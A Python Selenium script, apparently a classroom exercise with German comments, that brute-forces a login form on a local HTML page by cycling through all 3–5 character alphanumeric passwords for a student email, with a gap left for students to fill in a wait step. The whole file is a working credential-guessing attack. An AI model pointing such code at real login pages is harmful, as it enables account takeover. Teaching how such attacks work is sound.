from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager  # For auto-managing ChromeDriver
import itertools
import string


# Lokale HTML-Datei (Pfad zur Datei auf deinem Rechner)
file_path = "file:///<pfad zu html Datei>"

# Setup des Webdrivers (öffnet Chrome) mit dem ChromeDriverManager
service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)

# Öffne die lokale HTML-Datei in Chrome
driver.get(file_path)

# Mögliche Zeichenkombinationen (Kleinbuchstaben, Großbuchstaben, Zahlen)
characters = string.ascii_letters + string.digits

# Vorgegebene E-Mail-Adresse
email = "schueler@example.com"

# Funktion zum Brute-Forcing des Passworts
def brute_force():
    # Alle Kombinationen der Länge 3 bis 5 Zeichen durchprobieren
    for length in range(3, 6):
        for password in itertools.product(characters, repeat=length):
            password = ''.join(password)

            # Finde das E-Mail- und Passwortfeld im Browser
            email_field = driver.find_element(By.ID, 'email')
            password_field = driver.find_element(By.ID, 'password')
            login_button = driver.find_element(By.TAG_NAME, 'button')

            # E-Mail eingeben
            email_field.clear()
            email_field.send_keys(email)

            # Passwort eingeben
            password_field.clear()
            password_field.send_keys(password)

            # Auf den Login-Button klicken
            login_button.click()

            # Warte, damit die Seite reagiert
            #erganze hier!!!!!#

            # Überprüfen, ob der Erfolgstext erscheint
            try:
                success_message = driver.find_element(By.ID, 'success')
                if success_message.is_displayed():
                    print(f"Erfolgreich eingeloggt mit Passwort: {password}")
                    return password
            except:
                # Fehlermeldung wurde nicht gefunden, Passwort ist falsch
                print(f"Passwort {password} war falsch.")
    
    print("Kein korrektes Passwort gefunden.")
    return None

# Starte den Brute-Force-Versuch
brute_force()

# Schließe den Browser
driver.quit()
